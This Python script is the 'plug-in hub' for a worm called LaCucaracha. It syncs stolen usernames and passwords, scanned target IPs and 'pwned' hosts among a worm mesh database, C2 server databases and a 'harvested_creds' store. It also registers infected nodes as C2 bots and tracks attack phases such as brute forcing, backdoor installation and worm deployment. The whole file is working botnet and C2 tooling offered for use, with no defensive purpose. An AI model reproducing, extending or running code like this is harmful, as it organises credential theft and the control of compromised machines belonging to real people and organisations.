#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LA CUCARACHA — PLUG-IN HUB                                                ║
║  Plugs LaCucaracha into ALL target/cred sources across the infrastructure. ║
║  by 🇭🇷PhonkAlphabet                                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

Functions:
  import_all()           — Import targets + creds from ALL discovered DBs
  sync_back()            — Push new worm pwns/nodes back to C2 DB
  get_c2_creds()         — Returns list of (username, password, service) from C2
  get_c2_targets()       — Returns list of (ip, port) from C2
  dashboard()            — Print unified dashboard of all sources
"""

import json
import logging
import os
import sqlite3
import sys
import time
import uuid

log = logging.getLogger("worm.plugin")

# ── DB Paths ──────────────────────────────────────────────────────────────────
WORM_DB = "/opt/hermes/worm_mesh.db"
C2_DB = "/opt/c2/hybrid_c2.db"
BORG_INTEL = "/opt/borg/undead_intel.db"
C2_UNIFIED = "/opt/c2/unified_c2.db"
C2_BOT = "/opt/c2/c2_bot.db"
C2_OPS = "/opt/c2/ops_board.db"

# ── Helpers ───────────────────────────────────────────────────────────────────

def _conn(db_path: str) -> sqlite3.Connection:
    c = sqlite3.connect(db_path)
    c.row_factory = sqlite3.Row
    c.execute("PRAGMA busy_timeout=5000")
    return c

def _now() -> int:
    return int(time.time())

# ── Import C2 Credentials → Worm DB ───────────────────────────────────────────

def import_c2_creds() -> dict:
    """Import ALL credentials from C2 DB into worm_mesh.db.
    Returns {imported: N, skipped: N, total: N}."""
    stats = {"imported": 0, "skipped": 0, "total": 0}
    try:
        c2 = _conn(C2_DB)
        rows = c2.execute(
            "SELECT target, username, password, service FROM creds WHERE username IS NOT NULL"
        ).fetchall()
        c2.close()
    except Exception as e:
        log.error(f"C2 creds read failed: {e}")
        return stats

    try:
        worm = _conn(WORM_DB)
        stats["total"] = len(rows)
        for row in rows:
            target_ip = row["target"] or "0.0.0.0"
            username = row["username"]
            password = row["password"] or ""
            service = (row["service"] or "ssh").lower()

            # Map service names
            if "basic" in service or "http" in service:
                svc = "http"
            elif service in ("telnet", "ssh"):
                svc = service
            else:
                svc = "ssh"

            port = {"telnet": 23, "http": 80, "ssh": 22}.get(svc, 22)

            # Upsert
            existing = worm.execute(
                "SELECT id FROM credentials WHERE target_ip=? AND username=? AND password=? AND port=?",
                (target_ip, username, password, port)
            ).fetchone()
            if existing:
                stats["skipped"] += 1
                continue

            cid = str(uuid.uuid4())
            now = _now()
            worm.execute(
                "INSERT INTO credentials (id, target_ip, port, username, password, service, source, first_seen, last_seen) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (cid, target_ip, port, username, password, svc, "c2_import", now, now)
            )
            stats["imported"] += 1

        worm.commit()
        worm.close()
        log.info(f"C2 creds imported: {stats['imported']} new, {stats['skipped']} dupes of {stats['total']}")
    except Exception as e:
        log.error(f"Worm DB cred write failed: {e}")

    return stats

# ── Import C2 Targets → Worm DB ───────────────────────────────────────────────

def import_c2_targets() -> dict:
    """Import ALL targets from C2 DB into worm_mesh.db.
    Returns {imported: N, skipped: N, total: N}."""
    stats = {"imported": 0, "skipped": 0, "total": 0}
    try:
        c2 = _conn(C2_DB)
        rows = c2.execute("SELECT ip, alive, ports, fingerprint FROM targets").fetchall()
        c2.close()
    except Exception as e:
        log.error(f"C2 targets read failed: {e}")
        return stats

    try:
        worm = _conn(WORM_DB)
        stats["total"] = len(rows)
        for row in rows:
            ip = row["ip"]
            alive = row["alive"]

            # Parse ports JSON
            ports_str = row["ports"]
            ports = []
            if ports_str:
                try:
                    ports = json.loads(ports_str)
                except (json.JSONDecodeError, TypeError):
                    ports = [22]

            if not ports:
                ports = [22]

            for port in ports:
                port = int(port) if port else 22
                existing = worm.execute(
                    "SELECT id FROM targets WHERE ip=? AND port=?",
                    (ip, port)
                ).fetchone()
                if existing:
                    stats["skipped"] += 1
                    continue

                tid = str(uuid.uuid4())
                now = _now()

                # Map service from port
                service = {80: "http", 443: "https", 23: "telnet", 22: "ssh",
                           21: "ftp", 3306: "mysql", 5432: "postgresql",
                           8080: "http-alt", 8443: "https-alt",
                           3389: "rdp", 5900: "vnc"}.get(port, f"port-{port}")

                worm.execute(
                    "INSERT INTO targets (id, ip, port, protocol, service, scan_source, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (tid, ip, port, "tcp", service, "c2_import", now, now)
                )
                stats["imported"] += 1

        worm.commit()
        worm.close()
        log.info(f"C2 targets imported: {stats['imported']} new, {stats['skipped']} dupes of {stats['total']}")
    except Exception as e:
        log.error(f"Worm DB target write failed: {e}")

    return stats

# ── Import C2 Pwned → Worm DB Exploited ───────────────────────────────────────

def import_c2_pwned() -> dict:
    """Import pwned hosts from C2 DB into worm_mesh.db as exploited+credentials.
    Returns {imported: N, skipped: N, total: N}."""
    stats = {"imported": 0, "skipped": 0, "total": 0}
    try:
        c2 = _conn(C2_DB)
        rows = c2.execute(
            "SELECT ip, port, service, username, password, method FROM pwned"
        ).fetchall()
        c2.close()
    except Exception as e:
        log.error(f"C2 pwned read failed: {e}")
        return stats

    try:
        worm = _conn(WORM_DB)
        stats["total"] = len(rows)
        for row in rows:
            ip = row["ip"]
            port = row["port"] or 22
            service = row["service"] or "ssh"
            username = row["username"] or ""
            password = row["password"] or ""
            method = row["method"] or "c2_pwned"

            # Find matching target in worm DB
            target = worm.execute(
                "SELECT id FROM targets WHERE ip=? AND port=?",
                (ip, port)
            ).fetchone()

            if target:
                # Mark as exploited
                worm.execute(
                    "UPDATE targets SET exploited=1, last_seen=? WHERE id=?",
                    (_now(), target["id"])
                )
            else:
                # Add as new target
                tid = str(uuid.uuid4())
                now = _now()
                worm.execute(
                    "INSERT INTO targets (id, ip, port, protocol, service, scan_source, exploited, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?)",
                    (tid, ip, int(port), "tcp", service, "c2_pwned_import", now, now)
                )

            # Add credentials if available
            if username:
                existing = worm.execute(
                    "SELECT id FROM credentials WHERE target_ip=? AND username=? AND password=?",
                    (ip, username, password)
                ).fetchone()
                if not existing:
                    cid = str(uuid.uuid4())
                    now = _now()
                    worm.execute(
                        "INSERT INTO credentials (id, target_ip, port, username, password, service, source, first_seen, last_seen) "
                        "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                        (cid, ip, int(port), username, password, service, f"c2_pwned_{method}", now, now)
                    )

            stats["imported"] += 1

        worm.commit()
        worm.close()
        log.info(f"C2 pwned imported: {stats['imported']} of {stats['total']}")
    except Exception as e:
        log.error(f"Worm DB pwned write failed: {e}")

    return stats

# ── Import Borg Intel ──────────────────────────────────────────────────────────

def import_borg_intel() -> dict:
    """Import Borg undead_intel.db creds."""
    stats = {"imported": 0, "skipped": 0, "total": 0}
    try:
        borg = _conn(BORG_INTEL)
        rows = borg.execute(
            "SELECT * FROM harvested_creds"
        ).fetchall()
        borg.close()
    except Exception as e:
        log.debug(f"Borg intel not available: {e}")
        return stats

    try:
        worm = _conn(WORM_DB)
        stats["total"] = len(rows)
        for row in rows:
            row_dict = dict(row)
            ip = row_dict.get("target_ip") or row_dict.get("ip") or "0.0.0.0"
            username = row_dict.get("username") or ""
            password = row_dict.get("password") or ""
            service = row_dict.get("service") or "ssh"

            existing = worm.execute(
                "SELECT id FROM credentials WHERE target_ip=? AND username=? AND password=?",
                (ip, username, password)
            ).fetchone()
            if existing:
                stats["skipped"] += 1
                continue

            cid = str(uuid.uuid4())
            now = _now()
            worm.execute(
                "INSERT INTO credentials (id, target_ip, port, username, password, service, source, first_seen, last_seen) "
                "VALUES (?, ?, ?, ?, ?, ?, 'borg_intel', ?, ?)",
                (cid, ip, 22, username, password, service, now, now)
            )
            stats["imported"] += 1

        worm.commit()
        worm.close()
    except Exception as e:
        log.error(f"Borg intel import failed: {e}")

    return stats

# ── Sync Worm Pwned BACK to C2 DB ─────────────────────────────────────────────

def sync_back() -> dict:
    """Push new worm exploits back to C2 DB as pwned records.
    Returns {pushed: N, total_new: N}."""
    stats = {"pushed": 0, "skipped": 0, "worm_pwned": 0}
    try:
        worm = _conn(WORM_DB)
        # Get exploited targets from worm
        exploited = worm.execute(
            "SELECT t.ip, t.port, t.service, c.username, c.password "
            "FROM targets t LEFT JOIN credentials c ON c.target_ip = t.ip "
            "WHERE t.exploited = 1"
        ).fetchall()
        worm.close()
    except Exception as e:
        log.error(f"Worm exploited read failed: {e}")
        return stats

    stats["worm_pwned"] = len(exploited)

    try:
        c2 = _conn(C2_DB)
        for row in exploited:
            ip = row["ip"]
            port = row["port"] or 22
            service = row["service"] or "ssh"
            username = row["username"] or ""
            password = row["password"] or ""

            # Check if already in C2 pwned
            existing = c2.execute(
                "SELECT id FROM pwned WHERE ip=?", (ip,)
            ).fetchone()
            if existing:
                # Update
                c2.execute(
                    "UPDATE pwned SET port=?, service=?, username=?, password=?, last_seen=? WHERE ip=?",
                    (port, service, username, password, time.time(), ip)
                )
                stats["skipped"] += 1
            else:
                c2.execute(
                    "INSERT INTO pwned (ip, port, service, username, password, method, first_seen, last_seen, shell) "
                    "VALUES (?, ?, ?, ?, ?, 'worm_sync', ?, ?, 0)",
                    (ip, port, service, username, password, time.time(), time.time())
                )
                stats["pushed"] += 1

        c2.commit()
        c2.close()
        log.info(f"Synced back: {stats['pushed']} new C2 pwned, {stats['skipped']} updated")
    except Exception as e:
        log.error(f"C2 sync back failed: {e}")

    return stats

# ── Sync Worm Nodes → C2 Bots ─────────────────────────────────────────────────

def sync_nodes_to_c2() -> dict:
    """Push worm mesh nodes as C2 bots."""
    stats = {"pushed": 0, "skipped": 0}
    try:
        worm = _conn(WORM_DB)
        nodes = worm.execute(
            "SELECT ip, hostname, os, arch, port FROM nodes WHERE status='active'"
        ).fetchall()
        worm.close()
    except Exception as e:
        log.error(f"Worm nodes read failed: {e}")
        return stats

    try:
        c2 = _conn(C2_DB)
        for node in nodes:
            node_dict = dict(node)
            ip = node_dict["ip"]
            hostname = node_dict.get("hostname") or ip
            os_name = node_dict.get("os") or "unknown"
            arch = node_dict.get("arch") or "unknown"
            port = node_dict.get("port") or 22

            existing = c2.execute(
                "SELECT bot_id FROM bots WHERE ip=?", (ip,)
            ).fetchone()
            if existing:
                c2.execute(
                    "UPDATE bots SET last_seen=datetime('now'), hostname=?, arch=?, active=1 WHERE bot_id=?",
                    (hostname, arch, existing["bot_id"])
                )
                stats["skipped"] += 1
            else:
                bot_id = str(uuid.uuid4())
                c2.execute(
                    "INSERT INTO bots (bot_id, hostname, ip, arch, last_seen, active, tags, agent) "
                    "VALUES (?, ?, ?, ?, datetime('now'), 1, '[\"worm_mesh\"]', 'LaCucaracha')",
                    (bot_id, hostname, ip, arch)
                )
                stats["pushed"] += 1

        c2.commit()
        c2.close()
        log.info(f"Nodes→C2: {stats['pushed']} new bots, {stats['skipped']} updated")
    except Exception as e:
        log.error(f"Nodes→C2 sync failed: {e}")

    return stats


# ── Populate worm_mesh_v5.db (bot DB) ──────────────────────────────────────────

V5_DB = "/opt/hermes/worm_mesh_v5.db"

def populate_v5() -> dict:
    """Populate worm_mesh_v5.db with targets + creds from engine DB + C2.
    Maps exploit methods to v5 phase columns. SKIPS if already populated."""
    stats = {"targets": 0, "creds": 0}
    try:
        v5 = sqlite3.connect(V5_DB)
        v5.row_factory = sqlite3.Row
        # Check if already populated
        existing = v5.execute("SELECT COUNT(*) FROM targets").fetchone()[0]
        if existing > 1000:
            log.info(f"v5 already populated: {existing} targets — skipping re-import")
            v5.close()
            return {"targets": existing, "creds": 0}
    except Exception:
        pass
    try:
        # Read from engine DB
        w = _conn(WORM_DB)
        engine_targets = w.execute("SELECT * FROM targets").fetchall()
        engine_creds = w.execute("SELECT * FROM credentials").fetchall()
        exploited_ips = set(r["ip"] for r in w.execute(
            "SELECT ip FROM targets WHERE exploited=1"
        ).fetchall())
        w.close()
    except Exception as e:
        log.error(f"Engine DB read for v5 failed: {e}")
        return stats

    # Read from C2 pwned to get method breakdown
    c2_pwned_by_ip = {}
    try:
        c2 = _conn(C2_DB)
        for row in c2.execute("SELECT ip, port, service, method FROM pwned").fetchall():
            r = dict(row)
            c2_pwned_by_ip[r["ip"]] = r
        c2.close()
    except Exception:
        pass

    try:
        v5 = sqlite3.connect(V5_DB)
        v5.row_factory = sqlite3.Row

        # Ensure targets table exists
        v5.execute("""CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT NOT NULL,
            port INTEGER NOT NULL,
            protocol TEXT DEFAULT 'tcp',
            first_seen TEXT DEFAULT (datetime('now')),
            last_seen TEXT DEFAULT (datetime('now')),
            fp_os TEXT DEFAULT '',
            fp_banner TEXT DEFAULT '',
            fp_service TEXT DEFAULT '',
            fp_ttl INTEGER DEFAULT 0,
            fp_http_server TEXT DEFAULT '',
            icmp_alive INTEGER DEFAULT 0,
            tcp_open INTEGER DEFAULT 1,
            cve_scanned INTEGER DEFAULT 0,
            cve_vulns TEXT DEFAULT '',
            web_pwned INTEGER DEFAULT 0,
            embed_pwned INTEGER DEFAULT 0,
            genzai_merged INTEGER DEFAULT 0,
            enterprise_pwned INTEGER DEFAULT 0,
            brute_pwned INTEGER DEFAULT 0,
            backdoor_installed INTEGER DEFAULT 0,
            tunnel_active INTEGER DEFAULT 0,
            worm_deployed INTEGER DEFAULT 0,
            intel_collected INTEGER DEFAULT 0,
            crossfeed_count INTEGER DEFAULT 0,
            report_generated INTEGER DEFAULT 0,
            UNIQUE(ip, port)
        )""")
        v5.execute("""CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT, port INTEGER, service TEXT,
            username TEXT, password TEXT,
            source TEXT DEFAULT 'manual',
            first_seen TEXT DEFAULT (datetime('now')),
            last_used TEXT DEFAULT (datetime('now')),
            valid INTEGER DEFAULT 1,
            UNIQUE(ip, port, username, password)
        )""")
        v5.execute("""CREATE TABLE IF NOT EXISTS intel_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_ip TEXT DEFAULT '',
            message TEXT DEFAULT '',
            created_at TEXT DEFAULT (datetime('now'))
        )""")

        # Batch insert NEW targets + UPDATE existing targets' phase flags
        v5.execute("BEGIN TRANSACTION")
        target_inserts = []
        target_updates = []
        for row in engine_targets:
            r = dict(row)
            ip = r["ip"]
            port = int(r.get("port") or 22)
            exploited = int(r.get("exploited") or 0)

            web_p = embed_p = ent_p = brute_p = 0
            if exploited and ip in c2_pwned_by_ip:
                method = (c2_pwned_by_ip[ip].get("method") or "").lower()
                service = (c2_pwned_by_ip[ip].get("service") or "").lower()
                if "web" in method or "http" in method or "basic" in service:
                    web_p = 1
                elif "embed" in method:
                    embed_p = 1
                elif "enterprise" in method:
                    ent_p = 1
                elif "brute" in method or "telnet" in service or "ssh" in service:
                    brute_p = 1
            elif exploited:
                # Exploited but no C2 method data — mark as generic exploited
                web_p = 1

            target_inserts.append((ip, port, exploited, exploited, web_p, embed_p, ent_p, brute_p))
            target_updates.append((exploited, exploited, web_p, embed_p, ent_p, brute_p, ip, port))

        if target_inserts:
            v5.executemany(
                "INSERT OR IGNORE INTO targets (ip, port, icmp_alive, tcp_open, "
                "web_pwned, embed_pwned, enterprise_pwned, brute_pwned) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                target_inserts
            )
        if target_updates:
            v5.executemany(
                "UPDATE targets SET icmp_alive=?, tcp_open=?, "
                "web_pwned=MAX(web_pwned,?), embed_pwned=MAX(embed_pwned,?), "
                "enterprise_pwned=MAX(enterprise_pwned,?), brute_pwned=MAX(brute_pwned,?) "
                "WHERE ip=? AND port=?",
                target_updates
            )
        stats["targets"] = v5.total_changes
        v5.commit()

        # Batch insert credentials (separate txn in case it fails)
        v5.execute("BEGIN TRANSACTION")
        cred_rows = []
        for row in engine_creds:
            r = dict(row)
            cred_rows.append((
                r.get("target_ip", ""),
                r.get("username", ""),
                r.get("password", ""),
                r.get("service", "ssh")
            ))

        if cred_rows:
            v5.executemany(
                "INSERT OR IGNORE INTO credentials (ip, port, username, password, service, source) "
                "VALUES (?, ?, ?, ?, ?, 'hub')",
                [(r[0], 0, r[1], r[2], r[3]) for r in cred_rows]
            )
        stats["creds"] = v5.total_changes - stats["targets"]
        v5.commit()

        # Count actual rows in v5 after population
        actual_targets = v5.execute("SELECT COUNT(*) FROM targets").fetchone()[0]
        actual_creds = v5.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
        v5.close()
        log.info(f"v5 populated: {actual_targets} targets (+{stats['targets']} new), {actual_creds} creds (+{stats['creds']} new)")
    except Exception as e:
        log.error(f"v5 population failed: {e}")

    return stats


# ── Dashboard ──────────────────────────────────────────────────────────────────

def dashboard() -> dict:
    """Return unified stats from all connected DBs."""
    report = {}

    # Worm DB
    try:
        w = _conn(WORM_DB)
        report["worm_targets"] = w.execute("SELECT COUNT(*) FROM targets").fetchone()[0]
        report["worm_exploited"] = w.execute("SELECT COUNT(*) FROM targets WHERE exploited=1").fetchone()[0]
        report["worm_creds"] = w.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
        report["worm_nodes"] = w.execute("SELECT COUNT(*) FROM nodes WHERE status='active'").fetchone()[0]
        w.close()
    except Exception:
        pass

    # C2 DB
    try:
        c = _conn(C2_DB)
        report["c2_bots"] = c.execute("SELECT COUNT(*) FROM bots").fetchone()[0]
        report["c2_creds"] = c.execute("SELECT COUNT(*) FROM creds").fetchone()[0]
        report["c2_pwned"] = c.execute("SELECT COUNT(*) FROM pwned").fetchone()[0]
        report["c2_targets"] = c.execute("SELECT COUNT(*) FROM targets").fetchone()[0]
        c.close()
    except Exception:
        pass

    return report

# ── Full Import ────────────────────────────────────────────────────────────────

def import_all() -> dict:
    """Run all imports: targets + creds + pwned from all DBs.
    Returns combined stats dict."""
    results = {}
    print("═══ LA CUCARACHA — PLUG-IN HUB ═══")
    print("→ Importing C2 credentials into worm DB...")
    results["creds_c2"] = import_c2_creds()
    print(f"  ✅ {results['creds_c2']['imported']} imported, {results['creds_c2']['skipped']} dupes")

    print("→ Importing C2 targets into worm DB...")
    results["targets_c2"] = import_c2_targets()
    print(f"  ✅ {results['targets_c2']['imported']} imported, {results['targets_c2']['skipped']} dupes")

    print("→ Importing C2 pwned hosts as exploited...")
    results["pwned_c2"] = import_c2_pwned()
    print(f"  ✅ {results['pwned_c2']['imported']} imported")

    print("→ Importing Borg intel...")
    results["borg_intel"] = import_borg_intel()
    print(f"  ✅ {results['borg_intel']['imported']} imported")

    print("→ Syncing worm nodes back to C2 DB...")
    results["sync_nodes"] = sync_nodes_to_c2()
    print(f"  ✅ {results['sync_nodes']['pushed']} new C2 bots, {results['sync_nodes']['skipped']} updated")

    print("→ Syncing exploited targets back to C2 DB...")
    results["sync_back"] = sync_back()
    print(f"  ✅ {results['sync_back']['pushed']} new C2 pwned, {results['sync_back']['skipped']} updated")

    print("→ Populating worm_mesh_v5.db (bot DB)...")
    results["v5"] = populate_v5()
    print(f"  ✅ {results['v5']['targets']} v5 targets, {results['v5']['creds']} v5 creds")

    print("\n═══ POST-IMPORT DASHBOARD ═══")
    d = dashboard()
    for k, v in d.items():
        print(f"  {k}: {v}")

    return results


# ── CLI Entry Point ────────────────────────────────────────────────────────────

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

    mode = sys.argv[1] if len(sys.argv) > 1 else "all"

    if mode == "all":
        import_all()
    elif mode == "creds":
        r = import_c2_creds()
        print(json.dumps(r, indent=2))
    elif mode == "targets":
        r = import_c2_targets()
        print(json.dumps(r, indent=2))
    elif mode == "pwned":
        r = import_c2_pwned()
        print(json.dumps(r, indent=2))
    elif mode == "sync":
        r1 = sync_back()
        r2 = sync_nodes_to_c2()
        print(json.dumps({"pwned": r1, "nodes": r2}, indent=2))
    elif mode == "sync-back":
        r = sync_back()
        print(json.dumps(r, indent=2))
    elif mode == "v5":
        r = populate_v5()
        print(json.dumps(r, indent=2))
    elif mode == "dashboard":
        d = dashboard()
        print(json.dumps(d, indent=2))
    else:
        print(f"Usage: {sys.argv[0]} [all|creds|targets|pwned|sync|dashboard]")
        sys.exit(1)
